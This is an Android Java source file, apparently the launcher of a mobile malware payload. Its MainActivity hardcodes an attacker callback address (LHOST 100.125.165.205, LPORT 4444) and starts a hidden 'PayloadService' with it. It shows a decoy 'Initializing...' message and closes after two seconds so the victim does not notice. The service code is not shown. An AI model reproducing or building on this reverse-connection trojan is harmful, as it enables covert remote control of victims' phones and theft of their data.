package com.cybergforce.payload;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.Toast;

public class MainActivity extends Activity {
    private static final String LHOST = "100.125.165.205";
    private static final int LPORT = 4444;
    private Handler handler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Start payload service
        Intent service = new Intent(this, PayloadService.class);
        service.putExtra("LHOST", LHOST);
        service.putExtra("LPORT", LPORT);
        startService(service);

        // Show decoy UI
        Toast.makeText(this, "Initializing...", Toast.LENGTH_SHORT).show();

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                finish();
            }
        }, 2000);
    }
}
